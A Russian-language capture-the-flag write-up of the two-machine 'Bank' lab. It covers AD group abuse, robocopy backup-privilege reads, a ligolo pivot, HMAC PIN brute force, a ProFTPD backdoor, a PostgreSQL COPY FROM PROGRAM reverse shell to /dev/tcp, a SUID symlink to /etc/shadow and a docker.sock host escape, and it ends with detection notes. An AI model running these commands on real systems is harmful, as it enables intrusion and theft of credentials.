# Bank: пин из HMAC, пивот и побег через docker.sock

**Таск:** Bank (aclabs.pro, сложная, 2 машины, 6 флагов; сезон в разборе не помечен)
**Цепочка:** скрытый файл → WinRM → GenericWrite в группу → robocopy от бэкап-привилегии → ligolo → брут пина против HMAC → бэкдор ProFTPD → COPY FROM PROGRAM → SUID → docker.sock.

## Футхолд (Windows)

Типичный контроллер домена с вебом: 53, 80 (IIS), 88, 445, LDAP, 5985. Домен `bank.acl`. В исходнике сайта — упоминание каталога `employees`: файлы скрытые, но счётчик растёт. Значит, имена есть, отдача нет — фаззим по префиксу:

```bash
ffuf -u http://<ip>/employees/.FUZZ -w directory-list-2.3-medium.txt -ic -c -e .txt
```

`script.txt` в браузере отдаёт кириллицу криво — curl в файл и читать. Внутри base64-креды `web-srv`, вход через evil-winrm. Флаг на его десктопе.

## Эскалация: GenericWrite

SharpHound: GenericWrite на группу Server Operators. Добавляем себя, релогин — SeBackup/SeRestore в кармане:

```powershell
Add-ADGroupMember -Identity "Server Operators" -Members "web-srv"
robocopy /b C:\Users\Administrator\Desktop C:\Users\web-srv\Desktop /E
```

`/b` — режим бэкапа: читает поверх ACL за счёт привилегии. Флаг с десктопа админа.

## Пивот и пин

Второй адаптер — подсеть 10.10.20.0/24, PowerShell TcpClient-скрипт находит 10.10.20.227. Туннель через ligolo, `listener_add` для обратных коннектов. Веб «хранилища»: кука `vault-signature` — HMAC-SHA256, ключ — восьмизначный пин, сообщение константа. Пробег 100M пинов чистым питоном — минуты:

```python
sig = hmac.new(f"{i:08d}".encode(), b"Vault7", hashlib.sha256).hexdigest()
```

Совпало — хранилище открыто, на linux-хосте поднялись порты: 21 (ProFTPD), 80, 5432.

## ProFTPD и SUID

Бэкдор pre-auth в ProFTPD — инъекция создаёт юзера backdoor с uid=0. Креды PostgreSQL в `/etc/proftpd/proftpd.conf`, подключение суперюзером и реверс через COPY:

```sql
COPY shell FROM PROGRAM 'bash -c "bash -i >& /dev/tcp/<ip>/4444 0>&1"';
```

Нюанс: бинарник для следующего шага при передаче через postgres-канал портился — md5 не сходился. Через curl на uploadserver — сходится. Хэш сверять после любой передачи через странный канал.

`find -perm /4000` — нестандартный `/usr/bin/cati`. Ghidra: setuid(0) и чтение `/var/www/html/input`. Симлинк на `/etc/shadow`, брут хэша — root в контейнере.

## docker.sock

Записываемый `/var/run/docker.sock`. Через API — привилегированный контейнер с корнем хоста:

```bash
curl -s --unix-socket /var/run/docker.sock -X POST http://localhost/containers/create \
  -d '{"Image":"alpine","Cmd":["cat","var/tmp/root/root.txt"],"Binds":["/:/var/tmp"],"Privileged":true}'
```

start + logs через тот же сокет — финальный флаг с хоста.

## Как поймать

GenericWrite-эскалация — 5136 (изменение членов группы) от не-админа. Брут пина — тысячи POST с одной сессией и меняющейся кукой. docker.sock внутри контейнера — не событие, а конфиг: сокета там быть не должно, проверяется аудитом, не SIEM'ом.

## Заметка

Шесть звеньев, ни одно не экзотика: счётчик в исходнике, групповая эскалация, брут HMAC, бэкдор FTP, SUID, сокет. По отдельности каждое — «да ладно, так не делают», вместе — домен и хост. В копилку: `robocopy /b` как способ прочитать чужой десктоп без отдельных тулз, и Server Operators как группа, про которую забывают, а в ней бэкап-привилегии.
